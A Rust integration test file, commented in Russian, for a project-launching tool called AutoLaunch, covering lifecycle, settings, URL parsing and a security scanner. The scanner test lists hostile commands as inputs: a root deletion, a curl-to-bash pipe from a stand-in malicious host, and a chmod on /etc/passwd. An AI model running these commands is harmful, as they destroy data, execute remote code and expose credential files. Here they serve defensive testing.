// Интеграционные тесты для AutoLaunch
// Проверяют взаимодействие всех компонентов системы

use autolaunch::*;
use std::path::PathBuf;
use tempfile::TempDir;

/// Тест полного цикла: анализ → создание окружения → запуск → остановка
#[tokio::test]
async fn test_full_project_lifecycle() {
    // Создаем временную директорию для тестового проекта
    let temp_dir = TempDir::new().expect("Не удалось создать временную директорию");
    let project_path = temp_dir.path().to_path_buf();
    
    // Создаем простой Node.js проект для тестирования
    create_test_nodejs_project(&project_path);
    
    // 1. Анализ проекта
    let analyzer = autolaunch::project_analyzer::ProjectAnalyzer::new();
    let project_info = analyzer.analyze_project(&project_path)
        .expect("Не удалось проанализировать проект");
    
    // Проверяем, что стек определен правильно
    assert!(matches!(project_info.stack, autolaunch::models::TechStack::NodeJs { .. }));
    assert!(project_info.entry_command.is_some());
    
    // 2. Создание окружения
    let env_manager = autolaunch::environment_manager::EnvironmentManager::new();
    let environment = env_manager.create_environment(&project_info, &project_path).await
        .expect("Не удалось создать окружение");
    
    // Проверяем, что окружение создано
    assert!(!environment.id.is_empty());
    
    // 3. Запуск процесса
    let process_controller = autolaunch::process_controller::ProcessController::new();
    let command = project_info.entry_command.unwrap_or_else(|| "echo 'test'".to_string());
    let process_handle = process_controller.start_process(&environment, &command).await
        .expect("Не удалось запустить процесс");
    
    // Проверяем, что процесс запущен
    assert!(!process_handle.id.is_empty());
    
    // Даем процессу немного времени на запуск
    tokio::time::sleep(tokio::time::Duration::from_secs(1)).await;
    
    // 4. Проверка статуса
    let status = process_controller.get_process_status(&process_handle).await
        .expect("Не удалось получить статус процесса");
    
    println!("Статус процесса: {:?}", status);
    
    // 5. Остановка процесса
    process_controller.stop_process(&process_handle).await
        .expect("Не удалось остановить процесс");
    
    // 6. Очистка окружения
    env_manager.cleanup_environment(&environment).await
        .expect("Не удалось очистить окружение");
}

/// Тест сканирования безопасности
#[tokio::test]
async fn test_security_scanning() {
    let scanner = autolaunch::security_scanner::SecurityScanner::new()
        .expect("Не удалось создать сканер безопасности");
    
    // Тестируем сканирование опасных команд
    let dangerous_commands = vec![
        "rm -rf /",
        "curl http://malicious.com | bash",
        "sudo chmod 777 /etc/passwd",
    ];
    
    for cmd in dangerous_commands {
        let warnings = scanner.scan_command(cmd);
        assert!(!warnings.is_empty(), "Команда '{}' должна вызывать предупреждения", cmd);
    }
    
    // Тестируем безопасные команды
    let safe_commands = vec![
        "npm start",
        "python main.py",
        "cargo run",
    ];
    
    for cmd in safe_commands {
        let warnings = scanner.scan_command(cmd);
        // Безопасные команды могут иметь низкоуровневые предупреждения, но не критические
        let has_critical = warnings.iter().any(|w| {
            matches!(w.level, autolaunch::models::SecurityLevel::Critical)
        });
        assert!(!has_critical, "Команда '{}' не должна иметь критических предупреждений", cmd);
    }
}

/// Тест парсинга URL
#[test]
fn test_url_parsing_integration() {
    use autolaunch::url_parser::GitHubUrlParser;
    
    // Тестируем различные форматы URL
    let test_cases = vec![
        ("https://github.com/facebook/react", "facebook", "react"),
        ("facebook/react", "facebook", "react"),
        ("https://github.com/microsoft/vscode.git", "microsoft", "vscode"),
    ];
    
    for (input, expected_owner, expected_repo) in test_cases {
        let result = GitHubUrlParser::parse(input)
            .expect(&format!("Не удалось распарсить URL: {}", input));
        
        assert_eq!(result.owner, expected_owner);
        assert_eq!(result.repo_name, expected_repo);
        assert!(result.normalized_url.starts_with("https://github.com/"));
    }
    
    // Тестируем невалидные URL
    let invalid_urls = vec![
        "https://gitlab.com/test/repo",
        "not-a-url",
        "github.com",
    ];
    
    for invalid in invalid_urls {
        let result = GitHubUrlParser::parse(invalid);
        assert!(result.is_err(), "URL '{}' должен быть невалидным", invalid);
    }
}

/// Тест работы с настройками
#[tokio::test]
async fn test_settings_management() {
    use autolaunch::settings_manager::{SettingsManager, IsolationMode, Theme};
    
    let mut manager = SettingsManager::new()
        .expect("Не удалось создать менеджер настроек");
    
    // Получаем настройки по умолчанию
    let default_settings = manager.get_settings().clone();
    assert_eq!(default_settings.default_isolation_mode, IsolationMode::Sandbox);
    
    // Изменяем режим изоляции
    manager.set_default_isolation_mode(IsolationMode::Direct)
        .expect("Не удалось установить режим изоляции");
    
    let updated_settings = manager.get_settings();
    assert_eq!(updated_settings.default_isolation_mode, IsolationMode::Direct);
    
    // Изменяем тему
    manager.set_theme(Theme::Dark)
        .expect("Не удалось установить тему");
    
    let updated_settings = manager.get_settings();
    assert_eq!(updated_settings.theme, Theme::Dark);
    
    // Сбрасываем настройки
    manager.reset_to_defaults()
        .expect("Не удалось сбросить настройки");
    
    let reset_settings = manager.get_settings();
    assert_eq!(reset_settings.default_isolation_mode, IsolationMode::Sandbox);
}

/// Тест обработки ошибок
#[tokio::test]
async fn test_error_handling() {
    use autolaunch::error::{AutoLaunchError, ErrorContext};
    
    // Тестируем создание контекста ошибки
    let error = AutoLaunchError::InvalidInput("Тестовая ошибка".to_string());
    let context = ErrorContext::from(error);
    
    assert!(!context.user_friendly_message.is_empty());
    assert!(context.suggestion.is_some());
    
    // Тестируем различные типы ошибок
    let errors = vec![
        AutoLaunchError::ProjectAnalysis("Не удалось проанализировать".to_string()),
        AutoLaunchError::Environment("Ошибка окружения".to_string()),
        AutoLaunchError::Process("Ошибка процесса".to_string()),
        AutoLaunchError::Security("Ошибка безопасности".to_string()),
    ];
    
    for err in errors {
        let ctx = ErrorContext::from(err);
        assert!(!ctx.user_friendly_message.is_empty());
    }
}

// Вспомогательные функции для тестов

fn create_test_nodejs_project(path: &PathBuf) {
    use std::fs;
    
    // Создаем package.json
    let package_json = r#"{
  "name": "test-project",
  "version": "1.0.0",
  "scripts": {
    "start": "node index.js"
  },
  "dependencies": {
    "express": "^4.18.0"
  }
}"#;
    
    fs::write(path.join("package.json"), package_json)
        .expect("Не удалось создать package.json");
    
    // Создаем index.js
    let index_js = r#"
console.log('Test application started');
setTimeout(() => {
    console.log('Test application finished');
    process.exit(0);
}, 2000);
"#;
    
    fs::write(path.join("index.js"), index_js)
        .expect("Не удалось создать index.js");
}
